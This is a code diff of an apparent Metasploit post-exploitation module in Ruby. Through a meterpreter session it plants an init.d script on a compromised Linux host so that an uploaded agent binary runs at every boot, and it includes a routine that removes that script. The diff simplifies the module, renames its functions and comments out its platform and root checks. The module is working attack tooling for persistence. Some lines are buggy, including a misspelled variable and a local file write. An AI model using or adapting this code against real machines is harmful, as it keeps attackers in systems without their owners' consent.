@@ -26,8 +26,6 @@
 # The full remote path of binary to execute (remote) => set REMOTE_PATH /root/payload
 # The full remote path of init.d directory  (remote) => set INIT_PATH /etc/init.d
 # Delete persistence script/configurations  (remote) => set DEL_PERSISTENCE true
-# Auto-Locate init.d directory full path?   (remote) => set AUTO_LOCATE true
-# HINT: 'AUTO_LOCATE true' will overwrite 'INIT_PATH' variable declarations
 #
 #
 # [ PORT MODULE TO METASPLOIT DATABASE ]
@@ -130,7 +128,6 @@ class MetasploitModule < Msf::Post
 
                 register_advanced_options(
                         [
-                                OptBool.new('LOCATE_INIT', [ false, 'Auto-Locate init.d directory full path?' , false]),
                                 OptString.new('INIT_PATH', [ false, 'The full remote path of init.d directory (eg /etc/init.d)']),
                                 OptBool.new('DEL_PERSISTENCE', [ false, 'Delete persistence script/configurations?' , false])
                         ], self.class) 
@@ -142,34 +139,23 @@ class MetasploitModule < Msf::Post
 #
 # Build remote init.d persistence script ..
 #
-def ls_persisting
+def ls_stage1
 
   session = client
   rem = session.sys.config.sysinfo
-  remote_path = datastore['REMOTE_PATH']     # /root/payload
-  init = datastore['INIT_PATH']              # /etc/init.d
-  find = datastore['LOCATE_INIT']            # false
-  #
-  # Auto-Locate init.d directory? (true|false)
-  #
-  if find == 'true'
-    auto = cmd_exe("locate init.d | grep -m 1 '.d'")
-    vprint_warning("Auto-Locate: #{auto}")
-    initd_path = "#{auto}"
-  else
-    initd_path = "#{init}"
-  end
-  script_check = "#{initd_path}/persistance" # /etc/init.d/persistance
+  remote_path = datastore['REMOTE_PATH'] # /root/payload
+  init = datastore['INIT_PATH']          # /etc/init.d
+  script_check = "#{init}/persistance"   # /etc/init.d/persistance
   #
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options ..
   #
   if datastore['REMOTE_PATH'] == 'nil'
-    vprint_error("Options not configurated correctly ..")
-    vprint_warning("Please set REMOTE_PATH option!")
+    print_error("Options not configurated correctly ..")
+    print_warning("Please set REMOTE_PATH option!")
     return nil
   else
-    vprint_status("Persist #{remote_path} agent ..")
+    print_status("Persist #{remote_path} agent ..")
     Rex::sleep(1.0)
   end
 
@@ -178,84 +164,74 @@ def ls_persisting
     # Check if persistence its allready active ..
     #
     if session.fs.file.exist?(script_check)
-      vprint_error("%red" + "init.d: #{script_check} found ..")
-      vprint_error("Post-module reports that persistence its allready active ..")
-      vprint_error("Please use DEL_PERSISTENCE option before running this funtion ..")
+      print_error("init.d: #{script_check} found ..")
+      print_error("Post-module reports that persistence its allready active ..")
+      print_error("Please use DEL_PERSISTENCE option before running this funtion ..")
       return nil
     end
     #
     # Check if agent its deployed (remote) ..
     #
     if not session.fs.file.exist?(remote_path)
-      vprint_error("%red" + "agent: #{remote_path} not found ..")
-      vprint_error("Please upload your agent before running this funtion ..")
+      print_error("agent: #{remote_path} not found ..")
+      print_error("Please upload your agent before running this funtion ..")
       return nil
     end
-    vprint_status("Remote agent full path found ..")
-    #
-    # Check init.d directory existance (remote)..
-    #
-    if not session.fs.directory.exist?(initd_path)
-      vprint_error("%red" + "path: #{initd_path} not found ..")
-      vprint_error("Please set a diferent path in 'INIT_PATH' option ..")
-      vprint_error("OR activate 'AUTO_LOCATE true' to auto-locate directory ..")
-      return nil
-    end
-    vprint_status("Remote service directory found ..")
+    print_status("Remote agent full path found ..")
 
       #
       # This is the init.d script that provides persistence on startup ..
       #
-      vprint_warning("Writing init.d persistence startup script ..")
+      print_warning("Writing init.d persistence startup script ..")
       Rex::sleep(1.0)
       File.open("#{script_check}", "w+") do |f|
-        f.write("#!/bin/sh")
-        f.write("### BEGIN INIT INFO")
-        f.write("# Provides:          persistence on kali")
-        f.write("# Required-Start:    $network $local_fs $remote_fs")
-        f.write("# Required-Stop:     $remote_fs $local_fs")
-        f.write("# Default-Start:     2 3 4 5")
-        f.write("# Default-Stop:      0 1 6")
-        f.write("# Short-Description: Persiste your binary (elf) in kali linux.")
-        f.write("# Description:       Allows users to persiste your binary (elf) in kali linux systems")
-        f.write("### END INIT INFO")
-        f.write("#")
-        f.write("# Give a little time to execute elf agent")
-        f.write("sleep 5 > /dev/null")
-        f.write("./#{remote_path}")
+        f.write("#!/bin/sh\n")
+        f.write("### BEGIN INIT INFO\n")
+        f.write("# Provides:          persistence on kali\n")
+        f.write("# Required-Start:    $network $local_fs $remote_fs\n")
+        f.write("# Required-Stop:     $remote_fs $local_fs\n")
+        f.write("# Default-Start:     2 3 4 5\n")
+        f.write("# Default-Stop:      0 1 6\n")
+        f.write("# Short-Description: Persiste your binary (elf) in kali linux.\n")
+        f.write("# Description:       Allows users to persiste your binary (elf) in kali linux systems\n")
+        f.write("### END INIT INFO\n")
+        f.write("#\n")
+        f.write("# Give a little time to execute elf agent\n")
+        f.write("sleep 5 > /dev/null\n")
+        f.write("sh #{remote_path}")
         f.close
       end
-      vprint_good("Service path: #{script_check}")
+      print_good("Service path: #{script_check}")
       Rex::sleep(1.0)
 
       #
       # Config init.d startup service (chmod + update-rc.d)
       #
       if session.fs.file.exist?(script_check)
-        vprint_good("Config init.d persistence script ..")
+        print_good("Config init.d persistence script ..")
         Rex::sleep(1.0)
         cmd_exec("chmod +x #{script_check}")
-        vprint_good("Update init.d service status (symlinks) ..")
+        print_good("Update init.d service status (symlinks) ..")
         Rex::sleep(1.0)
         cmd_exec("update-rc.d persistance defaults # 97 03")
       else
-        vprint_error("%red" + "init.d script: #{script_check} not found ..")
-        vprint_error("%red" + "Persistence not achieved ..")
+        print_error("init.d script: #{script_check} not found ..")
+        print_error("Persistence not achieved ..")
         return nil
       end
 
     #
     # Final displays to user ..
     #
-    vprint_status("Persistence achieved on: #{rem['Computer']}")
+    print_status("Persistence achieved on: #{rem['Computer']}")
     Rex::sleep(1.0)
-    vprint_line("")
+    print_line("")
 
   #
   # error exception funtion
   #
   rescue ::Exception => e
-  vprint_error("Error: #{e.class} #{e}")
+  print_error("Error: #{e.class} #{e}")
 end
 
 
@@ -265,33 +241,22 @@ end
 #
 # Delete init.d script and confs ..
 #
-def ls_cleanning
+def ls_stage2
 
   session = client
   rem = session.sys.config.sysinfo
   init = datastore['INIT_PATH']        # /etc/init.d
-  find = datastore['LOCATE_INIT']      # false
-  #
-  # Auto-Locate init.d directory? (true|false)
-  #
-  if find == 'true'
-    auto = cmd_exe("locate init.d | grep -m 1 '.d'")
-    vprint_warning("Auto-Locate: #{auto}")
-    initd_path = "#{auto}"
-  else
-    initd_path = "#{init}"
-  end
-  script_check = "#{initd_path}/persistance" # /etc/init.d/persistance
+  script_check = "#{init}/persistance" # /etc/init.d/persistance
   #
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options ..
   #
   if datastore['DEL_PERSISTENCE'] == 'nil'
-    vprint_error("Options not configurated correctly ..")
-    vprint_warning("Please set DEL_PERSISTENCE option!")
+    print_error("Options not configurated correctly ..")
+    print_warning("Please set DEL_PERSISTENCE option!")
     return nil
   else
-    vprint_status("Delete init.d persistence script ..")
+    print_status("Delete init.d persistence script ..")
     Rex::sleep(1.0)
   end
 
@@ -299,18 +264,18 @@ def ls_cleanning
     # Check init.d persiste script existance ..
     #
     if not session.fs.file.exist?(script_check)
-      vprint_error("%red" + "script: #{script_check} not found ..")
+      print_error("script: #{script_check} not found ..")
       return nil
     end
-    vprint_status("Persistence script full path found ..")
+    print_status("Persistence script full path found ..")
 
       #
       # Delete init.d script ..
       #
-      vprint_good("Remove script from init.d directory ..")
+      print_good("Remove script from init.d directory ..")
       Rex::sleep(1.0)
       cmd_exec("rm -f #{script_check}")
-      vprint_good("Delete persistence service (symlinks) ..")
+      print_good("Delete persistence service (symlinks) ..")
       cmd_exec("update-rc.d persistance remove")
       Rex::sleep(1.5)
 
@@ -318,25 +283,25 @@ def ls_cleanning
     # Check init.d persiste script existance (after delete) ..
     #
     if session.fs.file.exist?(script_check)
-      vprint_error("%red" + "script: #{script_check} not proper deleted ..")
-      vprint_error("Please manually delete : rm -f #{init}/persistance")
-      vprint_error("Please manually execute: update-rc.d persistance remove")
+      print_error("script: #{script_check} not proper deleted ..")
+      print_error("Please manually delete : rm -f #{init}/persistance")
+      print_error("Please manually execute: update-rc.d persistance remove")
       return nil
     end
 
     #
     # Final displays to user ..
     #
-    vprint_status("Persistence deleted from: #{rem['Computer']}")
-    vprint_warning("This module will NOT delete the binary from target ..")
+    print_status("Persistence deleted from: #{rem['Computer']}")
+    print_warning("This module will NOT delete the binary from target ..")
     Rex::sleep(1.0)
-    vprint_line("")
+    print_line("")
 
   #
   # error exception funtion
   #
   rescue ::Exception => e
-  vprint_error("Error: #{e.class} #{e}")
+  print_error("Error: #{e.class} #{e}")
 end
 
 
@@ -377,25 +342,25 @@ def run
     # Guidelines for Accepting Modules and Enhancements:https://goo.gl/OQ6HEE
     #
     # check for proper operative system (Linux)
-    if not session.platform == 'linux'
-      vprint_error("%red" + "[ ABORT ]: This module only works againt Linux systems")
-      return nil
-    end
+    #if not session.platform == 'linux'
+    #  print_error("[ ABORT ]: This module only works againt Linux systems")
+    #  return nil
+    #end
     #
     # Check if we are running in an higth integrity context ..
     #
-    if not is_root?
-      vprint_error("%red" + "[ ABORT ]: Root access is required ..")
-      return nil
-    end
+    #if not is_root?
+    #  print_error("[ ABORT ]: Root access is required ..")
+    #  return nil
+    #end
     #
     # check for proper session (meterpreter)
     # the non-return of sysinfo command reveals that we are not on a meterpreter session!
     #
     if not sysinfo.nil?
-      vprint_status("Running module against: #{sysnfo['Computer']}")
+      print_status("Running module against: #{sysnfo['Computer']}")
     else
-      vprint_error("%red" + "[ ABORT ]: This module only works in meterpreter sessions!")
+      print_error("[ ABORT ]: This module only works in meterpreter sessions!")
       return nil
     end
 
@@ -404,11 +369,11 @@ def run
 # Selected settings to run
 #
       if datastore['REMOTE_PATH']
-         ls_persisting
+         ls_stage1
       end
 
       if datastore['DEL_PERSISTENCE']
-         ls_cleanning
+         ls_stage2
       end
    end
 end
